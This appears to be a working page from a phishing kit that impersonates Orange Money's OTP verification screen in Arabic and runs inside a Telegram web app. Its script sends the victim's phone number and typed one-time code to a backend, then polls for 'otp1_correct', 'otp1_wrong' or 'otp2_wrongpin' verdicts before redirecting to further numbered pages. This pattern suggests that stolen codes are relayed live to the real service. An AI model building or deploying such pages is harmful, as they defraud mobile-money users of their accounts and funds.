<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>التحقق من الرمز</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #f7f7f7; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; margin: 0; min-height: 100vh; }
        .header-box { width: 100%; background: #f16e00; padding: 25px; color: white; text-align: center; font-size: 24px; font-weight: bold; }
        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 16px; margin-top: 20px; text-align: center; }
        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; direction: ltr; }
        .code-box { width: 45px; height: 50px; border: 2px solid #f16e00; border-radius: 10px; text-align: center; font-size: 20px; font-weight: bold; }
        .submit-btn { width: 100%; background: #e0e0e0; color: #999; border: none; padding: 16px; border-radius: 10px; font-weight: bold; cursor: not-allowed; }
        .submit-btn.active { background: #f16e00; color: white; cursor: pointer; }
        .error-message { color: #e74c3c; display: none; margin-top: 10px; }
    </style>
</head>
<body>

<div class="header-box">Orange Money</div>

<div class="card">
    <h2>أدخل رمز التحقق (OTP)</h2>
    <p>أدخل الرمز المكون من 6 خانات المرسل لهاتفك</p>

    <!-- 6 Input Boxes for OTP -->
    <div class="code-input-container">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
        <input type="text" maxlength="1" class="code-box">
    </div>

    <div id="errorText" class="error-message">الرمز المدخل غير صحيح، يرجى المحاولة مرة أخرى.</div>
    <button id="submitBtn" class="submit-btn" disabled>تحقق</button>
</div>

<script>
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const errorText = document.getElementById('errorText');
    const savedPhone = localStorage.getItem('phone');

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
            checkInputs();
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) codeBoxes[index - 1].focus();
        });
    });

    function checkInputs() {
        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
        submitBtn.disabled = fullCode.length !== 6;
        submitBtn.classList.toggle('active', fullCode.length === 6);
        errorText.style.display = 'none';
    }

    submitBtn.addEventListener('click', async () => {
        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
        if (codeValue.length < 6) return;

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: savedPhone, code: codeValue })
            });
            const data = await res.json();
            if (data.success) {
                // Poll status for correct/wrong OTP
                const interval = setInterval(async () => {
                    const statusRes = await fetch(`/api/check-status?phone=${savedPhone}`);
                    const statusData = await statusRes.json();
                    if (statusData.status === "otp1_correct") {
                        clearInterval(interval);
                        window.location.href = "/page9";
                    } else if (statusData.status === "otp1_wrong") {
                        clearInterval(interval);
                        errorText.style.display = "block";
                        codeBoxes.forEach(b => b.value = "");
                        codeBoxes[0].focus();
                        checkInputs();
                    } else if (statusData.status === "otp2_wrongpin") {
                        clearInterval(interval);
                        window.location.href = "/page6?error=wrongpin";
                    }
                }, 2000);
            }
        } catch (e) { console.error(e); }
    });
</script>
</body>
</html>
